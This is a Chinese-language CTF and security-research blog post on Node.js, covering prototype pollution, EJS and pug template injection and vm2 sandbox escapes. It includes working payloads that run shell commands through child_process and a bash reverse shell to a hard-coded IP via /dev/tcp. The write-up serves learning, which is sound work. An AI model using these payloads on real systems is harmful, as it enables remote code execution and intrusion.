---
title: nodejs相关
date: 2019-11-17 16:15:38
author: ch3n9w
typora-root-url: ../
categories: 安全研究
---



不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久

<!--more-->

![image-20211114141704409](/images/javascript-learn/image-20211114141704409.png)



很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对象, 但是如果将constructor实施的话, 就是产生一个拥有新货物的仓库, 也就是cat实例对象, 那么类又是什么概念? 就像是给仓库定下一个整理计划, 这个计划叫做constructor, 而这个计划还没有实施, 你说他是静态的仓库(对象)似乎不妥, 因为有计划的存在, 这个仓库是可变的, 这个状态可以变化的仓库就叫做类.

当然这种比喻很牵强, 我也不知道合不合理, 也只是为了更好理解原型链污染而做的臆想... 



然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:

![image-20211114141713445](/images/javascript-learn/image-20211114141713445.png)



字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型.



## NPUCTF 2020 验证🐎

参考

[https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/](https://www.plasf.cn/2020/04/25/Node专题训练-1/)



## 春秋战疫赛 Ez_express

源代码如下

index.js

```javascript
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;

// 这个merge可以造成原型链污染
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}

// clone和merge效果一样
const clone = (a) => {
  return merge({}, a);
}


function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}

router.get('/', function (req, res) {
  if(!req.session.user){
    res.redirect('/login');
  }
  res.outputFunctionName=undefined;
  res.render('index',data={'user':req.session.user.user});
});


router.get('/login', function (req, res) {
  res.render('login');
});


router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
      // 这里safekeyword就是不让通过ADMIN进行注册
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
        // toUpperCase()除了正常的大小写转化之外会将一些特殊字符进行一个转化
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")}
    // 这里有触发原型链污染的机会
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
module.exports = router;
```

要触发原型链污染有个前提条件:  登录admin, 看源码的意思就是首先需要注册一个ADMIN, 但是``safekeyword``函数将这个操作限制住了, 然而``toUpperCase``有字符转化的特点, 参考

https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

因此使用``admın ``和随意的密码去注册一个用户, 就可以登录admin了, 登录admin之后通过action发送如下数据包



```
{"__proto__":{"outputFunctionName":"_tmp1;return global.process.mainModule.constructor._load('child_process').execSync('ls');//"}}
```



发送完之后访问一下/info就拿到了flag

![image-20200223184607314](/images/image-20200223184607314.png)





https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501

[https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg](https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split second/split second.md?tdsourcetag=s_pctim_aiomsg)

## 2019 XNUCA hardjs 复现

页面功能: 注册 登录 发表评论

拿到源代码之后首先使用命令``npm audit``来自动检测一下是否有存在漏洞的依赖包

![image-20200123220813194](/images/image-20200123220813194.png)

一个原型链污染漏洞, 好的. 看下``lodash``是干啥的

![image-20200123220954191](/images/image-20200123220954191.png)



查看源代码部分看看在哪里用到了这个``lodash``

![image-20200123221147765](/images/image-20200123221147765.png)

大意是访问``/get``路由就会从根据userid从数据库中查询出消息, 判断条数, 如果大于5条的话, 就会对每一条都进行一个``lodash.defaultsDeep``函数处理, 查查看payload

```javascript
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"a0": true}}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```

那么构造一个类似的应该就可以污染任意参数了.

然后思路是想通过xss让对面的bot将作为flag的password发送出来, 但是和传统的发送url链接让对面bot查看的方式不一样, 我们没有这么个玩意. 那么想要xss怎么办? 只能伪造登录进bot的账号, 再在bot的消息列表中插入xss代码, 等对面查看的时候就可以触发了, 那么怎么伪造登录呢?

查看一下登录验证的代码

![image-20200123224339539](/images/image-20200123224339539.png)

好, 那么可以考虑一下把``login``还有``userid``这俩都给污染成true

![image-20200123224551590](/images/image-20200123224551590.png)

多发几次然后路由访问``/get``去触发一下, 把cookie都删掉重新访问后就会发现成功以userid=1的身份登录了.

登录完之后就要考虑怎么在页面中插入xss代码了

在app.js中有这么一段

![image-20200123233543747](/images/image-20200123233543747.png)

这个``$.extend``相当于合并数组, 这种操作也可以造成原型链污染,``CVE-2019-11358`` 再来看页面渲染的部分

![image-20200123235223013](/images/image-20200123235223013.png)

会把符合条件的hints标签都拿出来渲染一遍, 在这个过程中会将沙盒作用在这些标签上

![image-20200123235208032](/images/image-20200123235208032.png)

也就是为什么在如图地方直接写xss代码会无效的原因

![image-20200123235558341](/images/image-20200123235558341.png)

观察渲染模板``index.ejs``, 发现有一个标签``logger``不在沙盒限制中并且符合条件, 那么, 可以污染hints让他的原型中包含logger从而让hints在遍历的过程中遍历到logger然后去渲染他, logger里的内容自然是post表单了.



![image-20200123233034091](/images/image-20200123233034091.png)

还有一种解法, 等我会调试js了就去补





### jade pug 模板注入

```
const pug=require('pug');

pug.render('#{console.log("1")}');
pug.render('-console.log(1)');
```

renderfile也可以模板注入

```

cmd = 'bash -i >& /dev/tcp/192.168.220.157/8888 0>&1'

payload = "process.binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})" % cmd

pug = ('''-[]["constructor"]["constructor"]("{}")()'''.format(payload)).replace('"','%22').replace("'","%27")
# pug = ('''#{[]["constructor"]["constructor"]("%s")()}'''%(payload)).replace('"','%22').replace("'","%27")
print quote(pug)
```

https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g



## 虎符杯 2020 JustEscape

由这个题目而来

https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS

可以通过以下形式来进行计算

```
http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1-1
```

但是

```
http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1%2b1
```

会得到

![image-20200420112457355](/images/image-20200420112457355.png)



从后来的表现来看, 是被过滤了.

![image-20200420114138186](/images/image-20200420114138186.png)

看题目的提示,可能后端不是php, 看到插件wappalyzer显示

![image-20200420114321997](/images/image-20200420114321997.png)

而且, ``Date()``函数 在javascript中可以用, 不带参数. php中没有.所以可以判断后端其实是nodejs写的.

用``Error().stack``来获取可以使用的模块信息.

```
Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)
```

使用payload, 从https://github.com/patriksimek/vm2/issues/225 找到的最新的.

```
?code[]=try{Buffer.from(new Proxy({}, {getOwnPropertyDescriptor(){throw f=>f.constructor("return process")();}}));}catch(e){e(()=>{}).mainModule.require("child_process").execSync("cat /flag").toString();}
```



原题的payload在这里打不了

```
var process;
try{
Object.defineProperty(Buffer.from(""),"",{
value:new Proxy({},{
getPrototypeOf(target){
if(this.t)
throw Buffer.from;
this.t=true;
Object.getPrototypeOf(target);
}
})
});
}catch(e){
trueprocess = e.constructor("return process")();
}
process.mainModule.require("child_process").execSync("ls").toString()

```



